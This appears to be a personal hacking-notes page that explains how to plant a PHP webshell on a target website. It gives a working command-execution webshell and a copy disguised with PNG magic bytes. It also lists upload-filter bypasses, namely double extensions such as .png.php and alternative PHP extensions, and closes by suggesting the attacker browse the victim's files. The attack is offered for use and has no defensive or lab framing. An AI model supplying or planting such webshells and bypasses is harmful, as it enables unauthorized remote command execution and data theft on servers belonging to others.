A **PHP webshell** is a payload you upload to a web server to **run system commands remotely** via the browser.

a simple PHP webshell
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

save it as ```webshell.php``` and upload it to the target site.

some websites try to make it harder for us to upload our PHP code (i wonder why)
lucky we have ways to bypass a few of the blocking methods

## png

	alot of website only let you upload images, so we will need to change our
	 script to work around some restrictions.

#### .png.php
	some websites validate the file we upload only by checking if the file name
	contains .png, 
```python
	if(".png" in filename)
```
	easiest way to bypass it is by changing our webshell file name 
	to webshell.png.php

#### png via magic numbers

	some websites validate the file we upload via magic numbers
	magic numbers are a set of hex chars at the start of a file that 
	identify the file type.
	the way to bypass it is just to add the png magic numbers to our webshell
```php
�PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">

<input type="TEXT" name="cmd" autofocus id="cmd" size="80">

<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
## PHP work around

	some websites block file ending with .php - wtf thats toxic
	lucky its not the end of the world, we can try to bypass it too
	there are a few extensions that still can run our php code while 
	not having the .php ## extension.
```
.php  
.php3  
.php4  
.php5  
.phtml
```
	change your file extension to one of them hoping it will work.
	good luck!

## aftermath
	after we got our webshell working we can try to find more info using commands
	to look thru the user's file

- [[ls – List Files in a Directory]] 
- [[locate – Find Files by Name]]
- [[cat – View File Contents 🐈]]